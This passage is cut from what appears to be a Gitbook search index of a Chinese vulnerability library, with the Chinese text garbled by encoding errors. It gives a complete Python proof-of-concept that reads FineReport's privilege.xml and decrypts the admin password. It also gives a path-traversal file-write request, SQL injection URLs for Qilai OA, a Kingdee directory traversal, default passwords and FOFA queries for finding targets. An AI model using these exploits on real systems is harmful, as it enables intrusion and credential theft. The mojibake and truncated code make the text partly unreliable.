CodeUtils.cjkDecode(WebUtils.getHTTPRequestParameter(var1, \"resourcepath\")); if (!WebUtils.invalidResourcePath(var4)) { InputStream var5 = FRContext.getCurrentEnv().readResource(var4); String var6 = IOUtils.inputStream2String(var5); var6 = var6.replace('\\ufeff', ' '); WebUtils.printAsString(var2, var6); } } public String getCMD() { return \"get_geo_json\"; } } ‰ΩøÁî®requestÂ∞ÜÊñá‰ª∂Âêç‰º†ÂÖ• Ë∞ÉÁî®cjkDecodeÂáΩÊï∞Ëß£ÂØÜÊñá‰ª∂Âêç ‰ΩøÁî®invalidResourcePathÂáΩÊï∞Ê†°È™åÊñá‰ª∂ÊòØÂê¶Â≠òÂú® ÊúÄÂêé‰ΩøÁî®readResourceÂáΩÊï∞ËØªÂèñÊñá‰ª∂‰º†ËæìÂà∞ÊµèËßàÂô®‰∏ä ÈªòËÆ§ÁõÆÂΩï‰∏∫resources ÂÖ∂‰∏≠ÁöÑprivilege.xmlÈáåÈù¢Â≠òÂÇ®‰∫ÜÂêéÂè∞ÁöÑÁî®Êà∑ÂêçÂØÜÁ†Å [!NOTE] Âä†ÂØÜÂáΩÊï∞ public static String passwordEncode(String var0) { StringBuilder var1 = new StringBuilder(); var1.append(\"___\"); if (var0 == null) { return var1.toString(); } else { int var2 = 0; for(int var3 = 0; var3 [!NOTE] Ëß£ÂØÜÂáΩÊï∞ public static String passwordDecode(String var0) { if (var0 != null && var0.startsWith(\"___\")) { var0 = var0.substring(3); StringBuilder var1 = new StringBuilder(); int var2 = 0; for(int var3 = 0; var3 ‰ΩøÁî®pythonÂÜôÂá∫ÁöÑËß£ÂØÜ‰ª£Á†Å‰∏∫ cipher = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' #ÂØÜÊñá PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #Êé©Á†Å Password = \"\" cipher = cipher[3:] #Êà™Êñ≠‰∏â‰ΩçÂêé for i in range(int(len(cipher) / 4)): c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16) c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8] Password = Password + chr(c2) print (Password) ËøôÈáå‰ΩøÁî®‰∏äÈù¢ËÆ≤Ëø∞ÁöÑÂéüÁêÜËøõË°åÂ§çÁé∞,ËÆøÈóÆÁõÆÊ†á [!NOTE] Ë∑ØÂæÑÂàÜ‰∏∫‰∏§Áßç /WebReport/ReportServer ReportServer ËÆøÈóÆPOC‰∏∫,ËØªÂèñÂØÜÁ†ÅÊñá‰ª∂ privilege.xml /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml ‰ΩøÁî®Ëß£ÂØÜËÑöÊú¨Ëß£ÂØÜÊñá‰ª∂ ÂæóÂà∞ÂØÜÁ†ÅÔºåÂç≥ÂèØÁôªÈôÜÂêéÂè∞Á≥ªÁªüÔºåË¥¶Êà∑‰∏∫ admin ÊºèÊ¥ûÂà©Áî®POC import requests import sys import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Â∏ÜËΩØÊä•Ë°® v8.0 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def decode_passwd(cipher): PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] # Êé©Á†Å Password = \"\" cipher = cipher[3:] # Êà™Êñ≠‰∏â‰ΩçÂêé for i in range(int(len(cipher) / 4)): c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16) c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8] Password = Password + chr(c2) return Password def POC_1(target_url): vuln_url_1 = target_url + '/WebReport/ReportServer' vuln_url_2 = target_url + '/ReportServer' headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response_1 = requests.get(url=vuln_url_1, timeout=5, verify=False, headers=headers) response_2 = requests.get(url=vuln_url_2, timeout=5, verify=False, headers=headers) if \"ÈÉ®ÁΩ≤È°µÈù¢\" in response_1.text: print(\"\\033[32m[o] ÁõÆÊ†áÈÉ®ÁΩ≤È°µÈù¢‰∏∫: {} \\033[0m\".format(vuln_url_1)) POC_2(vuln_url_1) elif \"ÈÉ®ÁΩ≤È°µÈù¢\" in response_2.text: print(\"\\033[32m[o] ÁõÆÊ†áÈÉ®ÁΩ≤È°µÈù¢‰∏∫: {} \\033[0m\".format(vuln_url_2)) POC_2(vuln_url_2) else: print(\"\\033[31m[x] ÁõÆÊ†áÊºèÊ¥ûÊó†Ê≥ïÂà©Áî® \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†áÊºèÊ¥ûÊó†Ê≥ïÂà©Áî® {} \\033[0m\".format(e)) sys.exit(0) def POC_2(vuln_url_fileread): vuln_url = vuln_url_fileread + \"?op=chart&cmd=get_geo_json&resourcepath=privilege.xml\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, verify=False, timeout=5) print(\"\\033[32m[o] Ê≠£Âú®ËÆøÈóÆ: {} \\033[0m\".format(vuln_url)) if \"rootManagerPassword\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†áÂ≠òÂú®ÊºèÊ¥û,ËØªÂèñÊïèÊÑüÊñá‰ª∂ \\n{} \\033[0m\".format(response.text)) user_name = re.findall(r'', response.text) cipher = re.findall(r'', response.text) password = decode_passwd(cipher[0]) print(\"\\033[34m[o] ÂêéÂè∞Ë¥¶Êà∑ÂØÜÁ†Å‰∏∫:{} {} \\033[0m\".format(user_name[0], password)) else: print(\"\\033[31m[x] ÁõÆÊ†á {}‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ FineReportv8.0_Arbitrary_file_read Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Â∏ÜËΩØOA/Â∏ÜËΩØ V9 ‰ªªÊÑèÊñá‰ª∂Ë¶ÜÁõñÊñá‰ª∂‰∏ä‰º†.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Â∏ÜËΩØOA/Â∏ÜËΩØ V9 ‰ªªÊÑèÊñá‰ª∂Ë¶ÜÁõñÊñá‰ª∂‰∏ä‰º†.html","title":"Â∏ÜËΩØ V9 ‰ªªÊÑèÊñá‰ª∂Ë¶ÜÁõñÊñá‰ª∂‰∏ä‰º†","keywords":"","body":"Â∏ÜËΩØ V9 ‰ªªÊÑèÊñá‰ª∂Ë¶ÜÁõñÊñá‰ª∂‰∏ä‰º† ÊºèÊ¥ûÊèèËø∞ Â∏ÜËΩØ V9 Â≠òÂú®‰ªªÊÑèÊñá‰ª∂Ë¶ÜÁõñÔºåÂØºËá¥ÊîªÂáªËÄÖÂèØ‰ª•‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Â∏ÜËΩØ V9 ÊºèÊ¥ûÂ§çÁé∞ POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp HTTP/1.1 Host: 192.168.10.1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE Connection: close Content-Type:text/xml;charset=UTF-8 Content-Length: 74 {\"__CONTENT__\":\"\",\"__CHARSET__\":\"UTF-8\"} Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Â∏ÜËΩØOA/Â∏ÜËΩØÊä•Ë°® 2012 SSRFÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Â∏ÜËΩØOA/Â∏ÜËΩØÊä•Ë°® 2012 SSRFÊºèÊ¥û.html","title":"Â∏ÜËΩØÊä•Ë°® 2012 SSRFÊºèÊ¥û","keywords":"","body":"Â∏ÜËΩØÊä•Ë°® 2012 SSRFÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Â∏ÜËΩØÊä•Ë°® 2012 Â≠òÂú®‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÈÄöËøáËÆøÈóÆÁâπÂÆöÁöÑUrlËé∑ÂèñÈÄ†ÊàêSSRF ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Â∏ÜËΩØÊä•Ë°® 2012 FOFA [!NOTE] body=\"down.download?FM_SYS_ID\" ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûÈ™åËØÅUrl‰∏∫ /ReportServer?op=resource&resource=0m0m6k.dnslog.cn Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Â∏ÜËΩØOA/Â∏ÜËΩØÊä•Ë°® 2012 ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Â∏ÜËΩØOA/Â∏ÜËΩØÊä•Ë°® 2012 ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"Â∏ÜËΩØÊä•Ë°® 2012 ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"Â∏ÜËΩØÊä•Ë°® 2012 ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Â∏ÜËΩØÊä•Ë°® 2012 Â≠òÂú®‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÈÄöËøáËÆøÈóÆÁâπÂÆöÁöÑUrlËé∑ÂèñÈÉ®ÂàÜÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Â∏ÜËΩØÊä•Ë°® 2012 FOFA [!NOTE] body=\"down.download?FM_SYS_ID\" ÊºèÊ¥ûÂ§çÁé∞ Ëé∑ÂèñÁôªÂΩïÊä•Ë°®Á≥ªÁªüÁöÑIP http://xxx.xxx.xxx.xxx/ReportServer?op=fr_server&cmd=sc_visitstatehtml&showtoolbar=false Êï∞ÊçÆÂ∫ì‰ø°ÊÅØÊ≥ÑÈú≤ http://xxx.xxx.xxx.xxx/ReportServer?op=fr_server&cmd=sc_getconnectioninfo ÂêéÂè∞ÈªòËÆ§Âè£‰ª§ admin/123456 /ReportServer?op=fr_auth&cmd=ah_login&_=new%20Date().getTime() Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Êñ∞ÁÇπOA/":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Êñ∞ÁÇπOA/","title":"Êñ∞ÁÇπOA","keywords":"","body":"Êñ∞ÁÇπOA Êñ∞ÁÇπOA ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Êñ∞ÁÇπOA/Êñ∞ÁÇπOA ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Êñ∞ÁÇπOA/Êñ∞ÁÇπOA ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"Êñ∞ÁÇπOA ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"Êñ∞ÁÇπOA ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Êñ∞ÁÇπOA Â≠òÂú®ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥ûÔºåËÆøÈóÆÁâπÂÆöÁöÑUrlÊó∂ÂèØ‰ª•Ëé∑ÂèñÊâÄÊúâÁî®Êà∑ÁöÑÁôªÂΩïÂêç‰ø°ÊÅØÔºåÊîªÂáªËÄÖËé∑ÂèñÂêéÂèØ‰ª•Ëøõ‰∏ÄÊ≠•Âà©Áî® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Êñ∞ÁÇπOA FOFA [!NOTE] app=\"Êñ∞ÁÇπOA\" ÊºèÊ¥ûÂ§çÁé∞ ÊûÑÈÄ†ÁöÑUrl‰∏∫ /ExcelExport/‰∫∫ÂëòÂàóË°®.xls Â∞Ü‰ºö‰∏ãËΩΩ‰∫∫ÂëòÂàóË°®Êñá‰ª∂ ÈÄöËøáËé∑ÂèñÁöÑÁôªÂΩïÂêçÁôªÈôÜÂêéÂè∞(ÈªòËÆ§ÂØÜÁ†Å11111) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈáëËù∂OA/":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈáëËù∂OA/","title":"ÈáëËù∂OA","keywords":"","body":"Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈáëËù∂OA/ÈáëËù∂OA server_file ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈáëËù∂OA/ÈáëËù∂OA server_file ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û.html","title":"ÈáëËù∂OA server_file ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û","keywords":"","body":"ÈáëËù∂OA server_file ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈáëËù∂OA server_file Â≠òÂú®ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÁõÆÂΩïÈÅçÂéÜÂèØ‰ª•Ëé∑ÂèñÊúçÂä°Âô®ÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈáëËù∂OA FOFA [!NOTE] app=\"Kingdee-EAS\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÁïåÈù¢‰∏∫ ÊºèÊ¥ûPOC /appmonitor/protected/selector/server_file/files?folder=/&suffix= WindowsÊúçÂä°Âô® appmonitor/protected/selector/server_file/files?folder=C://&suffix= LinuxÊúçÂä°Âô® appmonitor/protected/selector/server_file/files?folder=/&suffix= Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÂêØËé±OA/":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÂêØËé±OA/","title":"ÂêØËé±OA","keywords":"","body":"ÂêØËé±OA ÂêØËé±OA messageurl.aspx SQLÊ≥®ÂÖ•ÊºèÊ¥û ÂêØËé±OA treelist.aspx SQLÊ≥®ÂÖ•ÊºèÊ¥û ÂêØËé±OA CloseMsg.aspx SQLÊ≥®ÂÖ•ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÂêØËé±OA/ÂêØËé±OA messageurl.aspx SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÂêØËé±OA/ÂêØËé±OA messageurl.aspx SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"ÂêØËé±OA messageurl.aspx SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"ÂêØËé±OA messageurl.aspx SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÂêØËé±OA messageurl.aspxÊñá‰ª∂Â≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•Ëé∑ÂèñÊï∞ÊçÆÂ∫ìÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÂêØËé±OA FOFA [!NOTE] app=\"ÂêØËé±OA\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã Â≠òÂú®SQLÊ≥®ÂÖ•ÁöÑÊñá‰ª∂‰∏∫ messageurl.aspx http://xxx.xxx.xxx.xxx/client/messageurl.aspx?user=' and (select db_name())>0--&pwd=1 ‰ΩøÁî®SQLmapÂØπÂèÇÊï∞ user ËøõË°åÊ≥®ÂÖ• Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÂêØËé±OA/ÂêØËé±OA treelist.aspx SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÂêØËé±OA/ÂêØËé±OA treelist.aspx SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"ÂêØËé±OA treelist.aspx SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"ÂêØËé±OA treelist.aspx SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÂêØËé±OA treelist.aspxÊñá‰ª∂Â≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•Ëé∑ÂèñÊï∞ÊçÆÂ∫ìÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÂêØËé±OA FOFA [!NOTE] app=\"ÂêØËé±OA\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã Â≠òÂú®SQLÊ≥®ÂÖ•ÁöÑÊñá‰ª∂‰∏∫ treelist.aspx http://xxx.xxx.xxx.xxx/client/treelist.aspx?user=' and (select db_name())>0--&pwd=1 ‰ΩøÁî®SQLmapÂØπÂèÇÊï∞ user ËøõË°åÊ≥®ÂÖ• Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÂêØËé±OA/ÂêØËé±OA CloseMsg.aspx SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÂêØËé±OA/ÂêØËé±OA CloseMsg.aspx SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"ÂêØËé±OA CloseMsg.aspx SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"ÂêØËé±OA CloseMsg.aspx SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÂêØËé±OA CloseMsg.aspxÊñá‰ª∂Â≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•Ëé∑ÂèñÊï∞ÊçÆÂ∫ìÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÂêØËé±OA FOFA [!NOTE] app=\"ÂêØËé±OA\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã Â≠òÂú®SQLÊ≥®ÂÖ•ÁöÑÊñá‰ª∂‰∏∫ CloseMsg.aspx http://xxx.xxx.xxx.xxx/client/CloseMsg.aspx?user=' and (select db_name())>0--&pwd=1 ‰ΩøÁî®SQLmapÂØπÂèÇÊï∞ user ËøõË°åÊ≥®ÂÖ• Goby & POC Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/":{"url":"book/CMSÊºèÊ¥û/","title":"CMSÊºèÊ¥û","keywords":"","body":"CMS ÊºèÊ¥ûü¶Ö Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Weiphp/":{"url":"book/CMSÊºèÊ¥û/Weiphp/","title":"Weiphp","keywords":"","body":"Weiphp Weiphp5.0 ÂâçÂè∞Êñá‰ª∂‰ªªÊÑèËØªÂèñ CNVD-2020-68596 Weiphp5.0 ‰ªªÊÑèÁî®Êà∑Cookie‰º™ÈÄ† CNVD-2021-09693 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Weiphp/Weiphp5.0 ÂâçÂè∞Êñá‰ª∂‰ªªÊÑèËØªÂèñ CNVD-2020-68596.html":{"url":"book/CMSÊºèÊ¥û/Weiphp/Weiphp5.0 ÂâçÂè∞Êñá‰ª∂‰ªªÊÑèËØªÂèñ CNVD-2020-68596.html","title":"Weiphp5.0 ÂâçÂè∞Êñá‰ª∂‰ªªÊÑèËØªÂèñ CNVD-2020-68596","keywords":"","body":"Weiphp5.0 ÂâçÂè∞Êñá‰ª∂‰ªªÊÑèËØªÂèñ CNVD-2020-68596 ÊºèÊ¥ûÊèèËø∞ Weiphp5.0 Â≠òÂú®ÂâçÂè∞Êñá‰ª∂‰ªªÊÑèËØªÂèñÊºèÊ¥ûÔºåÂèØ‰ª•ËØªÂèñÊï∞ÊçÆÂ∫ìÈÖçÁΩÆÁ≠âÊïèÊÑüÊñá‰ª∂ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Weiphp ÁéØÂ¢ÉÊê≠Âª∫ weiphp5.0ÂÆòÊñπ‰∏ãËΩΩÂèÇËÄÉÊâãÂÜå ÂèÇËÄÉÂÆòÊñπÊâãÂÜåÂàõÂª∫ÁΩëÁ´ôÂç≥ÂèØ FOFA [!NOTE] app=\"WeiPHP\" ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûÂáΩÊï∞Êñá‰ª∂:application\\material\\controller\\Material.php ÊºèÊ¥ûÂáΩÊï∞:_download_imgage public function _download_imgage($media_id, $picUrl = '', $dd = null) { $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); mkdirs($savePath); $cover_id = 0; if (empty($picUrl)) { // Ëé∑ÂèñÂõæÁâáURL $url = 'https://api.weixin.qq.com/cgi-bin/material/get_material?access_token=' . get_access_token(); $param['media_id'] = $media_id; // dump($url); $picContent = post_data($url, $param, 'json', false); $picjson = json_decode($picContent, true); // dump($picjson);die; if (isset($picjson['errcode']) && $picjson['errcode'] != 0) { $cover_id = do_down_image($media_id, $dd['thumb_url']); if (!$cover_id) { return 0; exit(); } } $picName = NOW_TIME . uniqid() . '.jpg'; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $picContent); } else { $content = wp_file_get_contents($picUrl); // Ëé∑ÂèñÂõæÁâáÊâ©Â±ïÂêç $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } } if ($res) { $file = array( 'name' => $picName, 'type' => 'application/octet-stream', 'tmp_name' => $picPath, 'size' => $res, 'error' => 0 ); $File = D('home/Picture'); $cover_id = $File->addFile($file); } return $cover_id; } È¶ñÂÖàÊ≥®ÊÑèÂà∞ÂáΩÊï∞ÁöÑÊ†áËØÜ‰∏∫publicÔºå‰πüÂ∞±ÊòØËøô‰∏™ÂáΩÊï∞ÊòØÂÖ¨ÂÖ±Ë∞ÉÁî®ÁöÑÔºåÂπ∂‰∏îÂèòÈáèpicUrl‰∏∫ÂèØÊéßÂèòÈáè Ê†πÊçÆ‰ª£Á†Å‰ªé‰∏äÂêë‰∏ãÂàÜÊûê $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); ÂèòÈáè$savePathÁ°ÆÂÆöÊñá‰ª∂‰∏ä‰º†ÂêéÁöÑÁºìÂ≠ò‰ΩçÁΩÆ‰∏∫/public/uploads/picture/ÔºåÂπ∂ÊåâÁÖßÂπ¥-Êúà-Êó• ÂàõÂª∫Êñá‰ª∂Â§π Âêë‰∏ãÂØπÂèòÈáè$picUrl ÊòØÂê¶‰∏∫Á©∫ËøõË°åÂà§Êñ≠ÔºåÂπ∂Âà§Êñ≠ÊòØÂê¶ËøõË°åÁôªÂΩïÔºåËøôÈáå‰ΩøÁî®POST‰º†ÂèÇËøõË°åÈ™åËØÅÁôªÂΩïÁªïËøáÔºåË∑≥ËΩ¨Âà∞elseËØ≠Âè•‰∏ã else { $content = wp_file_get_contents($picUrl); // Ëé∑ÂèñÂõæÁâáÊâ©Â±ïÂêç $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } ÂàÜÊûê‰º†ÂÖ•ÂèòÈáè picUrl ÁöÑ wp_file_get_contentsÊñπÊ≥ï $content = wp_file_get_contents($picUrl); ÂáΩÊï∞Êñá‰ª∂‰ΩçÁΩÆ application\\common.php ÂèØ‰ª•ÁúãÂà∞ËøôÈáåÊ≤°ÊúâÂØπÊàë‰ª¨ÁöÑÂèÇÊï∞ËøõË°åËøáÊª§ÔºåÂè™ÂÅö‰∫Ü‰∏Ä‰∏™ÊúâÂÖ≥Ë∂ÖÊó∂ÁöÑÊìç‰Ωú, ÂõûÂà∞ÂáΩÊï∞ÁªßÁª≠Âêë‰∏ãÂàÜÊûê $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; 